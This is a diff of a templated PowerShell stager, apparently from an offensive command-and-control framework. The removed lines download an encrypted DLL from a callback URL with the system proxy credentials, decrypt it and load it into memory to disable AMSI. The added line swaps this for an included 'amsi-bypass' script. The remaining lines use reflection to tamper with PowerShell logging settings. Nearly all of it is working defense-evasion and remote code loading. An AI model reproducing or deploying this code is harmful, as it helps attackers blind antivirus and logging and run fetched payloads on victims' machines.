@@ -19,23 +19,7 @@ $string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
 {% endfor %}
 
 if ($PSVersionTable.PSVersion.Major -ge 5) {
-    if (-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
-        $K=new-object net.webclient
-        $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
-        $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-        $arch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
-        $DLL = $K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'l?arch='+$arch)
-        $DLL = [System.Convert]::FromBase64String($DLL)
-        $DLL = {{symbol_name("Decrypt-Code")}} $DLL ${{symbol_name("KEY")}}
-        [system.Reflection.Assembly]::Load([byte[]]$DLL)
-    }
-
-    if (-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
-        Throw "$string7"
-        Return
-    }
-
-    IEX "[$string1]::Disable()"
+    {% include "powershell/am0nsec-amsi-bypass.ps1" %}
 
     $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
     $settings[$string5] = @{}
